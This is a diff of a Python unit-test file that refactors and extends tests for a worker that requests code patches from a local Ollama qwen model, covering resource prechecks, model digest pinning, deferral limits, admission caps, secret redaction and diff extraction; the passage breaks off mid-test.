-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
-        ):
-            ok, _ = qwen.handle_qwen_patch(job)
+        ok, _ = self.run_handler()
 
         self.assertTrue(ok)
-        mock_request.assert_called_once()
+        self.assertEqual(len(self.generate_requests()), 1)
 
     def test_memory_source_unavailable_proceeds_with_warning(self) -> None:
         """A precheck that fails closed would silently stop every qwen job."""
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
         with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
             mock.patch("worker.qwen._available_memory_bytes", return_value=None),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
+            self.assertLogs("worker.qwen", level=logging.WARNING) as logs,
         ):
-            ok, _ = qwen.handle_qwen_patch(job)
+            ok, _ = self.run_handler()
 
         self.assertTrue(ok)
-        mock_request.assert_called_once()
+        self.assertEqual(len(self.generate_requests()), 1)
+        self.assertTrue(any("memory reading unavailable" in line for line in logs.output))
+
+    def test_parse_vm_stat_sums_free_inactive_speculative_pages(self) -> None:
+        sample = (
+            "Mach Virtual Memory Statistics: (page size of 16384 bytes)\n"
+            "Pages free:                               12345.\n"
+            "Pages active:                            100000.\n"
+            "Pages inactive:                           20000.\n"
+            "Pages speculative:                         3000.\n"
+            "Pages wired down:                         50000.\n"
+        )
+
+        self.assertEqual(qwen._parse_vm_stat(sample), (12345 + 20000 + 3000) * 16384)
+        self.assertIsNone(qwen._parse_vm_stat("no page size line"))
 
 
-# ---------------------------------------------------------------------------
-# Disk guard
-# ---------------------------------------------------------------------------
-
-
-class QwenDiskGuardTests(TempDirMixin, unittest.TestCase):
+class QwenDiskGuardTests(QwenHandlerCase):
     def test_low_disk_defers_and_writes_no_patch_file(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-        patch_dir = Path(self.tmpdir) / "patches"
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=patch_dir),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=1024),  # ~1KB, below MIN_FREE_DISK_GB
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        with mock.patch("worker.qwen._free_disk_bytes", return_value=1024):
+            ok, out = self.run_handler()
 
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("deferred-low-disk"))
-        if patch_dir.exists():
-            self.assertEqual(list(patch_dir.glob("*.patch")), [])
+        self.assertEqual(out, "deferred-low-disk")
+        self.assertEqual(self.patch_files(), [])
 
     def test_ample_disk_proceeds(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
-        ):
-            ok, _ = qwen.handle_qwen_patch(job)
+        ok, _ = self.run_handler()
 
         self.assertTrue(ok)
-        mock_request.assert_called_once()
+        self.assertEqual(len(self.patch_files()), 1)
 
     def test_disk_source_unreadable_proceeds_with_warning(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
         with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
             mock.patch("worker.qwen._free_disk_bytes", return_value=None),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
+            self.assertLogs("worker.qwen", level=logging.WARNING) as logs,
         ):
-            ok, _ = qwen.handle_qwen_patch(job)
+            ok, _ = self.run_handler()
 
         self.assertTrue(ok)
-        mock_request.assert_called_once()
+        self.assertTrue(any("disk reading unavailable" in line for line in logs.output))
 
 
-# ---------------------------------------------------------------------------
-# Model pinning
-# ---------------------------------------------------------------------------
+class QwenModelPinningTests(QwenHandlerCase):
+    """contract.model_pinning: compare against the install-time record."""
 
+    def _pin_status(self) -> object:
+        return self.span_attrs()[-1]["qwen.model_pin"]
 
-class QwenModelPinningTests(TempDirMixin, unittest.TestCase):
     def test_digest_mismatch_recorded_but_job_still_succeeds(self) -> None:
-        from worker import qwen
+        self.record_digest("0" * 64)
 
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job(
-            {
-                "files": ["src/README.md"],
-                "instruction": "add a line",
-                "model": "qwen2.5-coder:14b",
-            }
-        )
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value="sha256:unexpected"),
-        ):
-            ok, result = qwen.handle_qwen_patch(job)
+        with self.assertLogs("worker.qwen", level=logging.WARNING) as logs:
+            ok, result = self.run_handler()
 
         self.assertTrue(ok, "a digest mismatch must not fail the job")
-        self.assertIsInstance(result, dict)
-        self.assertIn("digest_matches_recorded", result)
-        self.assertFalse(result["digest_matches_recorded"])
+        assert isinstance(result, dict)
+        self.assertIs(result["digest_matches_recorded"], False)
+        self.assertEqual(result["model_digest"], RUNNING_DIGEST)
+        self.assertEqual(self._pin_status(), "mismatch")
+        self.assertTrue(any("digest drift" in line for line in logs.output))
 
+    def test_digest_match_is_true(self) -> None:
+        self.record_digest(f"sha256:{RUNNING_DIGEST.upper()}")
 
-# ---------------------------------------------------------------------------
-# Deferral bound — persistence first, then the ceiling.
-# ---------------------------------------------------------------------------
-
-
-class QwenDeferralBoundTests(TempDirMixin, unittest.TestCase):
-    """Drive the counter through a REAL retry cycle against a temp queue root.
-
-    worker.queue_ops functions bind ``root: Path = QUEUE_ROOT`` as a default
-    argument at *function definition* time, so reassigning the module-level
-    ``q.QUEUE_ROOT`` after import does not retarget already-defined
-    functions. Every call below passes ``root=self.queue_root`` explicitly,
-    matching the convention in tests/worker_tests/test_commands_gaps.py.
-    """
-
-    def setUp(self) -> None:
-        super().setUp()
-        self.queue_root = Path(self.tmpdir) / "queue"
-
-    def test_deferral_counter_persists_across_a_real_retry_cycle(self) -> None:
-        """This is where the first design failed: retry() reloads from disk
-        and writes only attempts/not_before/updated_at/last_error, so a
-        payload-embedded counter is inert. Persistence must live outside the
-        job record, on disk, and survive retry() + _undo_retry_attempt().
-        """
-        from worker.job_runtime import _undo_retry_attempt
-
-        job = q.Job(
-            id="deferral-persist-job",
-            type="qwen_patch",
-            payload={"files": ["src/README.md"], "instruction": "x"},
-            attempts=0,
-            max_attempts=3,
-        )
-        job_path = q.enqueue(job, root=self.queue_root)
-        proc_path = q.start_processing(job_path, root=self.queue_root)
-        self.assertIsNotNone(proc_path)
-        original_attempts = 0
-
-        # Simulate what the handler's deferral path drives: a real retry(),
-        # immediately undone the way _handle_outcome does for "deferred-*".
-        q.retry(proc_path, delay_sec=60, reason="deferred-qwen-busy", root=self.queue_root)
-        _undo_retry_attempt(proc_path.stem, original_attempts, q_root=self.queue_root)
-
-        # Read the job back OFF DISK — not from any in-memory dict the
-        # handler could have mutated.
-        pending_path = self.queue_root / "pending" / f"{job.id}.json"
-        self.assertTrue(pending_path.exists())
-        on_disk = json.loads(pending_path.read_text(encoding="utf-8"))
-        self.assertEqual(on_disk["attempts"], 0)
-        self.assertEqual(on_disk["last_error"], "deferred-qwen-busy")
-
-        # Now drive the qwen-side side-channel counter (get_worker_state_dir/
-        # 'qwen'/'deferrals'/<job_id>.json) through the same real cycle and
-        # confirm IT persists too, independent of the job record.
-        from worker import qwen
-
-        deferral_dir = Path(self.tmpdir) / "deferrals"
-        # "qwen-busy" is the canonical reason key (contract.json
-        # deferral_bound.where_persisted: {qwen-busy, low-memory, low-disk}),
-        # matching exactly what _handle_string_outcome passes for a real
-        # "deferred-qwen-busy" outcome — _record_deferral stores its reason
-        # argument verbatim with no translation.
-        with mock.patch("worker.qwen._deferral_dir", return_value=deferral_dir):
-            first = qwen._record_deferral(job.id, "qwen-busy")
-            second = qwen._record_deferral(job.id, "qwen-busy")
-
-        self.assertEqual(first, 1)
-        self.assertEqual(second, 2)
-        counter_path = deferral_dir / f"{job.id}.json"
-        self.assertTrue(counter_path.exists())
-        on_disk_counter = json.loads(counter_path.read_text(encoding="utf-8"))
-        self.assertEqual(on_disk_counter["count"], 2)
-        self.assertIn("qwen-busy", on_disk_counter["reasons"])
-
-    def test_deferral_limit_reached_at_exact_ceiling_is_terminal(self) -> None:
-        from worker import qwen
-
-        deferral_dir = Path(self.tmpdir) / "deferrals"
-        job_id = "deferral-ceiling-job"
-
-        with mock.patch("worker.qwen._deferral_dir", return_value=deferral_dir):
-            count = 0
-            for _ in range(qwen.THRESHOLDS.deferral_ceiling_count):
-                count = qwen._record_deferral(job_id, "deferred-qwen-busy")
-
-        self.assertEqual(count, qwen.THRESHOLDS.deferral_ceiling_count)
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "x"}, id=job_id)
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._deferral_dir", return_value=deferral_dir),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-            # Force the lock to be held permanently so the handler must defer.
-            mock.patch("worker.qwen._acquire_model_lock", return_value=False),
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
-
-        self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-deferral-limit"))
-        # The terminal result names the dominant deferral reason.
-        self.assertIn("qwen-busy", str(out))
-
-
-# ---------------------------------------------------------------------------
-# Admission cap (enforced_at == "handler-side" per contract.json)
-# ---------------------------------------------------------------------------
-
-
-class QwenAdmissionCapTests(TempDirMixin, unittest.TestCase):
-    def test_excess_job_returns_terminal_lane_over_capacity(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "x"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._lane_depth", return_value=qwen.THRESHOLDS.max_lane_depth),
-            mock.patch("worker.qwen._ollama_request") as mock_request,
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
-
-        self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-lane-over-capacity"))
-        mock_request.assert_not_called()
-
-    def test_another_job_type_at_same_depth_is_unaffected(self) -> None:
-        """_lane_depth is scoped to job_type; a full qwen_patch lane must not
-        touch admission for any other type. Proven by asserting _lane_depth
-        is called with 'qwen_patch' only — the handler has no visibility into
-        other types' lanes to begin with, which is the point.
-        """
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "x"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._lane_depth", return_value=0) as mock_lane_depth,
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, _ = qwen.handle_qwen_patch(job)
+        ok, result = self.run_handler()
 
         self.assertTrue(ok)
-        mock_lane_depth.assert_called_once_with("qwen_patch")
+        assert isinstance(result, dict)
+        self.assertIs(result["digest_matches_recorded"], True)
+        self.assertEqual(self._pin_status(), "match")
+
+    def test_no_recorded_digest_is_reported_unpinned(self) -> None:
+        with self.assertLogs("worker.qwen", level=logging.WARNING) as logs:
+            ok, result = self.run_handler()
+
+        self.assertTrue(ok)
+        assert isinstance(result, dict)
+        self.assertIsNone(result["digest_matches_recorded"])
+        self.assertEqual(self._pin_status(), "unpinned")
+        self.assertTrue(any("unpinned" in line for line in logs.output))
+
+    def test_record_for_a_different_model_is_unpinned(self) -> None:
+        self.record_digest(RUNNING_DIGEST, model="llama3:8b")
+
+        _, result = self.run_handler()
+
+        assert isinstance(result, dict)
+        self.assertIsNone(result["digest_matches_recorded"])
+        self.assertEqual(self._pin_status(), "unpinned")
+
+    def test_corrupt_record_is_unpinned_not_an_error(self) -> None:
+        self.digest_record.parent.mkdir(parents=True, exist_ok=True)
+        self.digest_record.write_text("{not json", encoding="utf-8")
+
+        ok, result = self.run_handler()
+
+        self.assertTrue(ok)
+        assert isinstance(result, dict)
+        self.assertIsNone(result["digest_matches_recorded"])
+
+    def test_running_digest_unreadable_is_unverified(self) -> None:
+        self.record_digest(RUNNING_DIGEST)
+        for error in (http_error(500), urllib.error.URLError(ConnectionRefusedError())):
+            with self.subTest(error=repr(error)):
+                self.tags_error = error
+                ok, result = self.run_handler()
+                self.assertTrue(ok)
+                assert isinstance(result, dict)
+                self.assertIsNone(result["model_digest"])
+                self.assertIsNone(result["digest_matches_recorded"])
+                self.assertEqual(self._pin_status(), "unverified")
+
+    def test_model_digest_reads_the_api_tags_models_list(self) -> None:
+        self.tags_response = {
+            "models": [
+                {"name": "llama3:8b", "digest": "1" * 64},
+                {"name": MODEL, "digest": RUNNING_DIGEST},
+            ]
+        }
+
+        self.assertEqual(qwen._model_digest("http://localhost:11434", MODEL), RUNNING_DIGEST)
+        self.assertIsNone(qwen._model_digest("http://localhost:11434", "missing:1b"))
+        self.assertEqual(self.requests[-1][0], "http://localhost:11434/api/tags")
 
 
-# ---------------------------------------------------------------------------
-# Redaction
-# ---------------------------------------------------------------------------
+class QwenDeferralBoundTests(QwenHandlerCase):
+    """contract.deferral_bound: count and wall-clock ceilings, plus cleanup."""
 
+    def _lock_unavailable(self) -> contextlib.AbstractContextManager[object]:
+        return mock.patch("worker.qwen._acquire_model_lock", return_value=False)
 
-class QwenRedactionTests(TempDirMixin, unittest.TestCase):
-    def test_credential_shape_in_error_is_masked_everywhere(self) -> None:
-        from worker import qwen
+    def test_deferral_counter_persists_across_a_real_retry_cycle(self) -> None:
+        """retry() reloads the job from disk and writes only attempts,
+        not_before, updated_at and last_error, so a payload-embedded counter
+        is inert. The side-channel file must survive retry() plus
+        _undo_retry_attempt()."""
+        from worker.job_runtime import _undo_retry_attempt
 
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "x"})
-        secret = "sk-supersecret-abc123"  # nosec B105 - fixture value asserted as masked, not a real credential
+        queue_root = Path(self.tmpdir) / "queue"
+        job = q.Job(id="deferral-persist-job", type="qwen_patch", payload={"files": [GREET_PATH], "instruction": "x"})
+        proc_path = q.start_processing(q.enqueue(job, root=queue_root), root=queue_root)
+        assert proc_path is not None
 
-        exc = RuntimeError(f"upstream failed: Authorization: Bearer {secret}")
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", side_effect=exc),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        with self._lock_unavailable():
+            ok, out = qwen.handle_qwen_patch(self.job(id=job.id))
+        q.retry(proc_path, delay_sec=60, reason=str(out), root=queue_root)
+        _undo_retry_attempt(proc_path.stem, 0, q_root=queue_root)
+        with self._lock_unavailable():
+            qwen.handle_qwen_patch(self.job(id=job.id))
 
         self.assertFalse(ok)
-        self.assertNotIn(secret, str(out))
+        on_disk = json.loads((queue_root / "pending" / f"{job.id}.json").read_text(encoding="utf-8"))
+        self.assertEqual(on_disk["attempts"], 0)
+        self.assertEqual(on_disk["last_error"], "deferred-qwen-busy")
+        counter = json.loads(self.deferral_file(job.id).read_text(encoding="utf-8"))
+        self.assertEqual(counter["count"], 2)
+        self.assertEqual(counter["reasons"], {"qwen-busy": 2})
+
+    def test_deferral_below_ceiling_stays_deferred(self) -> None:
+        ceiling = qwen.THRESHOLDS.deferral_ceiling_count
+        self.seed_deferrals(ceiling - 2, "qwen-busy")
+
+        with self._lock_unavailable():
+            ok, out = self.run_handler()
+
+        self.assertEqual((ok, out), (False, "deferred-qwen-busy"))
+        state = json.loads(self.deferral_file().read_text(encoding="utf-8"))
+        self.assertEqual(state["count"], ceiling - 1)
+
+    def test_deferral_limit_reached_at_exact_ceiling_is_terminal(self) -> None:
+        self.seed_deferrals(qwen.THRESHOLDS.deferral_ceiling_count - 1, "qwen-busy")
+
+        with self._lock_unavailable():
+            ok, out = self.run_handler()
+
+        self.assertEqual((ok, out), (False, "terminal-deferral-limit: qwen-busy"))
+        self.assertFalse(self.deferral_file().exists(), "side-channel file must be deleted on a terminal exit")
+
+    def test_low_memory_and_low_disk_deferrals_reach_the_limit(self) -> None:
+        for reason, seam in (("low-memory", "_available_memory_bytes"), ("low-disk", "_free_disk_bytes")):
+            with self.subTest(reason=reason):
+                self.seed_deferrals(qwen.THRESHOLDS.deferral_ceiling_count - 1, reason)
+                with mock.patch(f"worker.qwen.{seam}", return_value=1024):
+                    ok, out = self.run_handler()
+                self.assertEqual((ok, out), (False, f"terminal-deferral-limit: {reason}"))
+                self.assertFalse(self.deferral_file().exists())
+
+    def test_wallclock_backstop_triggers_limit(self) -> None:
+        self.deferral_dir.mkdir(parents=True)
+        forty_six_min_ago = time.time() - 46 * 60
+        self.deferral_file().write_text(
+            json.dumps({"count": 1, "reasons": {"qwen-busy": 1}, "first_deferred_at": forty_six_min_ago}),
+            encoding="utf-8",
+        )
+
+        with self._lock_unavailable():
+            ok, out = self.run_handler()
+
+        self.assertEqual((ok, out), (False, "terminal-deferral-limit: qwen-busy"))
+        self.assertFalse(self.deferral_file().exists())
+
+    def test_wallclock_below_backstop_stays_deferred(self) -> None:
+        self.deferral_dir.mkdir(parents=True)
+        forty_four_min_ago = time.time() - 44 * 60
+        self.deferral_file().write_text(
+            json.dumps({"count": 1, "reasons": {"qwen-busy": 1}, "first_deferred_at": forty_four_min_ago}),
+            encoding="utf-8",
+        )
+
+        with self._lock_unavailable():
+            self.assertEqual(self.run_handler(), (False, "deferred-qwen-busy"))
+
+    def _cleanup_case(self, expected_prefix: str, survives: bool, payload: dict[str, object] | None = None) -> None:
+        self.seed_deferrals(3, "qwen-busy")
+        ok, out = self.run_handler(payload)
+        self.assertTrue(str(out if not ok else "success").startswith(expected_prefix), out)
+        self.assertEqual(self.deferral_file().exists(), survives)
+        self.deferral_file().unlink(missing_ok=True)
+
+    def test_plain_failure_keeps_deferral_state(self) -> None:
+        """A plain failure is retried under the same job id and may defer again."""
+        self.generate_error = http_error(503)
+
+        self._cleanup_case(_PLAIN, survives=True)
+
+    def test_every_terminal_exit_clears_deferral_state(self) -> None:
+        with self.subTest(outcome="terminal-no-diff-found"):
+            self.generate_response = {"response": "no"}
+            self._cleanup_case("terminal-no-diff-found", survives=False)
+        with self.subTest(outcome="terminal-path-not-allowed"):
+            self._cleanup_case("terminal-path-not-allowed", survives=False, payload={"files": ["src/missing.py"]})
+        with self.subTest(outcome="terminal-model-not-found"):
+            self.generate_error = http_error(404)
+            self._cleanup_case("terminal-model-not-found", survives=False)
+
+    def test_success_clears_deferral_state(self) -> None:
+        self._cleanup_case("success", survives=False)
 
 
-# ---------------------------------------------------------------------------
-# Exception boundary
-# ---------------------------------------------------------------------------
+class QwenAdmissionCapTests(QwenHandlerCase):
+    def test_excess_job_returns_terminal_lane_over_capacity(self) -> None:
+        with mock.patch("worker.qwen._lane_depth", return_value=qwen.THRESHOLDS.max_lane_depth):
+            ok, out = self.run_handler()
+
+        self.assertEqual((ok, out), (False, "terminal-lane-over-capacity"))
+        self.assertEqual(self.generate_requests(), [])
+
+    def test_lane_depth_counts_only_qwen_patch_jobs(self) -> None:
+        """Ten pending jobs of another type must not fill the qwen lane."""
+        queue_root = Path(self.tmpdir) / "queue"
+        for i in range(qwen.THRESHOLDS.max_lane_depth):
+            q.enqueue(q.Job(id=f"cli-{i}", type="run_cli", payload={}), root=queue_root)
+        q.enqueue(q.Job(id="qwen-a", type="qwen_patch", payload={}), root=queue_root)
+        qwen_b = q.enqueue(q.Job(id="qwen-b", type="qwen_patch", payload={}), root=queue_root)
+        q.start_processing(qwen_b, root=queue_root)
+
+        with (
+            mock.patch("worker.queue_ops.QUEUE_ROOT", queue_root),
+            mock.patch("worker.qwen._lane_depth", wraps=REAL_LANE_DEPTH),
+        ):
+            self.assertEqual(qwen._lane_depth("qwen_patch"), 2)
+            self.assertEqual(qwen._lane_depth("run_cli"), qwen.THRESHOLDS.max_lane_depth)
+            ok, _ = self.run_handler()
+
+        self.assertTrue(ok, "a full run_cli lane must not trip the qwen_patch admission cap")
 
 
-class QwenExceptionBoundaryTests(TempDirMixin, unittest.TestCase):
+class QwenRedactionTests(QwenHandlerCase):
+    """contract.redaction: no secret reaches the outcome or the span."""
+
+    def _assert_masked(self, out: object) -> None:
+        self.assertNotIn(_FAKE_TOKEN, json.dumps(out))
+        self.assertNotIn(_FAKE_TOKEN, json.dumps(self.span_attrs(), default=str))
+        self.assertIn("REDACTED", str(out))
+
+    def test_secret_in_transport_error_is_masked_in_outcome_and_span(self) -> None:
+        errors = (
+            urllib.error.URLError(ConnectionRefusedError(f"refused token={_FAKE_TOKEN}")),
+            TimeoutError(f"timed out Authorization: Bearer {_FAKE_TOKEN}"),
+        )
+        for error in errors:
+            with self.subTest(error=type(error).__name__):
+                self.export.reset_mock()
+                self.generate_error = error
+                ok, out = self.run_handler()
+                self.assertFalse(ok)
+                self.assertTrue(str(out).startswith(f"{_PLAIN}: "), out)
+                self.assertEqual(len(self.span_attrs()), 1)
+                self._assert_masked(out)
+
+    def test_secret_in_guard_error_is_masked(self) -> None:
+        with mock.patch("worker.qwen._ollama_request", side_effect=qwen.QwenGuardError(f"http-error-502 token={_FAKE_TOKEN}")):
+            ok, out = self.run_handler()
+
+        self.assertFalse(ok)
+        self._assert_masked(out)
+
+    def test_secret_in_payload_path_is_masked(self) -> None:
+        ok, out = self.run_handler({"files": [f"src/x?api_key={_FAKE_TOKEN}"]})
+
+        self.assertFalse(ok)
+        self.assertTrue(str(out).startswith("terminal-path-not-allowed: "))
+        self._assert_masked(out)
+
+
+class QwenExceptionBoundaryTests(QwenHandlerCase):
     def test_prompt_assembly_exception_returns_masked_content_free_string(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
         secret_content = "MY-CONFIDENTIAL-FILE-CONTENTS-xyz"  # nosec B105 - fixture file content, not a real credential
-        (repo_root / "src" / "README.md").write_text(secret_content, encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "x"})
-
         boom = ValueError(f"could not assemble prompt: saw {secret_content!r}")
 
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen.resolve_input_files", side_effect=boom),
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        with mock.patch("worker.qwen._build_prompt", side_effect=boom):
+            ok, out = self.run_handler()
 
-        self.assertFalse(ok)
-        self.assertNotIn(secret_content, str(out))
-
-
-# ---------------------------------------------------------------------------
-# extract_diff (pure helper) — real Ollama output shape, plus edge cases.
-#
-# Confirmed via a live Ollama probe: the real model output is a ```diff
-# fenced block with ---/+++ a/ b/ headers and no prose. That exact shape is
-# _VALID_DIFF/_OLLAMA_RESPONSE above and is exercised as the happy path
-# throughout this file. This class adds the prose-wrapped and bare-diff
-# (no fence) variants as extra cases the extraction heuristic must also
-# handle, since a fence is not guaranteed from every response.
-# ---------------------------------------------------------------------------
+        self.assertEqual((ok, out), (False, "terminal-internal-error: ValueError"))
 
 
 class QwenExtractDiffTests(unittest.TestCase):
-    def test_extracts_fenced_diff_with_no_prose(self) -> None:
-        """The exact real Ollama output shape: a ```diff fence, ---/+++ a/ b/
-        headers, no surrounding prose."""
-        from worker import qwen
-
-        response_text = f"```diff\n{_VALID_DIFF}```"
-
-        extracted = qwen.extract_diff(response_text)
-
-        self.assertIsNotNone(extracted)
-        self.assertIn("--- a/README.md", extracted)
-        self.assertIn("+++ b/README.md", extracted)
+    def test_extracts_the_real_ollama_shape(self) -> None:
+        """survey.baseline_generation_post_install: ```diff fence, ---/+++
+        a/ b/ headers, no diff --git line, no prose."""
+        self.assertEqual(qwen.extract_diff(f"```diff\n{REAL_DIFF}\n```"), REAL_DIFF)
 
     def test_extracts_diff_wrapped_in_prose(self) -> None:
-        from worker import qwen
+        text = f"Sure, here's the change:\n\n```diff\n{REAL_DIFF}\n```\n\nAnything else?"
 
-        response_text = (
